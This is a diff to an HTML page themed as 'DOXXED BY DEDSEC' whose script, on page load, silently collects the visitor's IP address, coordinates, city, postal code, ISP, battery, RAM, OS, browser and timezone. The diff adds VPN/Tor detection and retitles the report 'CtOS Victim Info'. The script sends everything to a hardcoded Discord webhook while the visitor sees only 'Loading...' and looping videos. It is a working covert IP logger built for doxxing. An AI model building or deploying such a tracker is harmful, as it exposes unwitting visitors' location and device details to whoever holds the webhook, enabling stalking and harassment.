@@ -74,16 +74,21 @@
 
     <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>
 
-    <!-- Status (needed for script) -->
+    <video id="video-inferior" autoplay muted loop playsinline>
+        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
+    </video>
+    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
+        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
+    </video>
+
     <div id="status">Loading...</div>
 
-    <!-- SCRIPT EJECUTADO INMEDIATAMENTE, ANTES DE LOS VÍDEOS -->
     <script>
         (function() {
             const statusEl = document.getElementById('status');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
-            // Obtener datos del dispositivo (síncrono, instantáneo)
+            // Get static device data (instant)
             function getDeviceInfo() {
                 const nav = navigator;
                 const ua = nav.userAgent;
@@ -117,7 +122,7 @@
                 };
             }
 
-            // Obtener batería (asíncrona)
+            // Get battery info (async, but we run it in parallel)
             async function getBatteryInfo() {
                 try {
                     if (navigator.getBattery) {
@@ -133,16 +138,24 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            // Enviar a Discord (sin detección de VPN/TOR)
-            async function sendToDiscord(ipData, device, battery) {
-                // Campo fijo sin detección
-                const vpnTorStatus = 'No VPN/TOR';
+            // Send to Discord
+            async function sendToDiscord(ipData, device, battery, torDetected) {
+                // Determine VPN/TOR status
+                let vpnTorStatus = 'No VPN/TOR Found';
+                const proxyDetected = ipData.proxy === true;
+                if (proxyDetected && torDetected) {
+                    vpnTorStatus = 'VPN and TOR Detected';
+                } else if (proxyDetected) {
+                    vpnTorStatus = 'VPN Detected';
+                } else if (torDetected) {
+                    vpnTorStatus = 'TOR Detected';
+                }
 
                 const fields = [
                     { name: 'IP Address', value: ipData.ip || 'N/A', inline: true },
-                    { name: 'Coordinates', value: ipData.lat && ipData.lon ? ipData.lat + ', ' + ipData.lon : 'N/A', inline: true },
-                    { name: 'City / Region / Country', value: (ipData.city || 'N/A') + ', ' + (ipData.regionName || 'N/A') + ', ' + (ipData.country || 'N/A'), inline: false },
-                    { name: 'Postal Code / ISP', value: (ipData.zip || 'N/A') + ' | ' + (ipData.isp || ipData.org || 'N/A'), inline: false },
+                    { name: 'Coordinates', value: ipData.latitude && ipData.longitude ? ipData.latitude + ', ' + ipData.longitude : 'N/A', inline: true },
+                    { name: 'City / Region / Country', value: (ipData.city || 'N/A') + ', ' + (ipData.region || 'N/A') + ', ' + (ipData.country_name || 'N/A'), inline: false },
+                    { name: 'Postal Code / ISP', value: (ipData.postal || 'N/A') + ' | ' + (ipData.org || ipData.isp || 'N/A'), inline: false },
                     { name: 'RAM (GB)', value: device.deviceMemory || 'N/A', inline: true },
                     { name: 'Battery', value: battery.level + ' (Charging: ' + battery.charging + ')', inline: true },
                     { name: 'Operating System / Browser', value: device.os + ' / ' + device.browser, inline: true },
@@ -151,13 +164,14 @@
                     { name: 'Timezone', value: device.timezone || 'N/A', inline: true },
                     { name: 'Timestamp', value: device.timestamp || 'N/A', inline: false },
                     { name: 'Full User-Agent', value: device.userAgent || 'N/A', inline: false },
+                    { name: 'VPN/TOR Status', value: vpnTorStatus, inline: false }
                 ];
 
                 const payload = {
                     username: 'Bagley',
                     avatar_url: 'https://i.imgur.com/HsHtn2b.jpeg',
                     embeds: [{
-                        title: 'CtOS Info Loaded',
+                        title: 'CtOS Victim Info',
                         color: 0x00ff00,
                         fields: fields,
                         footer: { text: 'R3TRO' },
@@ -184,55 +198,65 @@
                 }
             }
 
-            // Ejecución principal (todo en paralelo)
+            // Main execution – ahora todo en paralelo
             async function execute() {
+                // 1. Obtener datos del dispositivo (síncrono, instantáneo)
                 const device = getDeviceInfo();
 
-                // Lanzar ambas peticiones en paralelo
+                // 2. Lanzar todas las promesas asíncronas en paralelo
                 const batteryPromise = getBatteryInfo();
-                const geoPromise = fetch('https://ip-api.com/json/')
+                const geoPromise = fetch('https://ipapi.co/json/')
+                    .then(res => res.ok ? res.json() : null)
+                    .catch(() => null);
+                const torPromise = fetch('https://check.torproject.org/api/ip')
                     .then(res => res.ok ? res.json() : null)
                     .catch(() => null);
 
-                const [battery, geo] = await Promise.all([batteryPromise, geoPromise]);
+                // Esperar a que todas terminen (la más lenta marca el tiempo total)
+                const [battery, geoData, torData] = await Promise.all([batteryPromise, geoPromise, torPromise]);
 
-                // Si falla geo, usar un objeto con solo IP (fallback rápido)
-                let ipData = geo;
+                // 3. Preparar los datos de geolocalización
+                let ipData = geoData;
                 if (!ipData || !ipData.ip) {
+                    // Fallback: usar ipify para obtener la IP y datos por defecto
                     try {
                         const ipResp = await fetch('https://api.ipify.org?format=json');
                         const ipJson = await ipResp.json();
                         ipData = {
                             ip: ipJson.ip,
-                            lat: 'N/A',
-                            lon: 'N/A',
+                            latitude: 'N/A',
+                            longitude: 'N/A',
                             city: 'N/A',
-                            regionName: 'N/A',
-                            country: 'N/A',
-                            zip: 'N/A',
+                            region: 'N/A',
+                            country_name: 'N/A',
+                            postal: 'N/A',
+                            org: 'N/A',
                             isp: 'N/A',
-                            org: 'N/A'
+                            proxy: false,
+                            tor: false
                         };
                     } catch (e) {
-                        ipData = { ip: 'Unknown', lat: 'N/A', lon: 'N/A', city: 'N/A', regionName: 'N/A', country: 'N/A', zip: 'N/A', isp: 'N/A', org: 'N/A' };
+                        // Si todo falla, usamos un objeto vacío
+                        ipData = { ip: 'Unknown', proxy: false, tor: false };
                     }
                 }
 
-                await sendToDiscord(ipData, device, battery);
+                // 4. Detectar TOR a partir del dato oficial
+                const torDetected = torData && torData.IsTor === true;
+
+                // 5. Enviar a Discord inmediatamente
+                await sendToDiscord(ipData, device, battery, torDetected);
             }
 
-            // Ejecutar inmediatamente (sin esperar a que termine de cargar la página)
-            execute();
+            // Ejecutar al cargar la página
+            if (document.readyState === 'complete') {
+                execute();
+            } else {
+                window.addEventListener('load', execute);
+            }
+
+            statusEl.textContent = 'Loading...';
         })();
     </script>
-
-    <!-- Vídeos (se cargan en segundo plano mientras el script ya está trabajando) -->
-    <video id="video-inferior" autoplay muted loop playsinline>
-        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
-    </video>
-    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
-        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
-    </video>
-
 </body>
 </html>
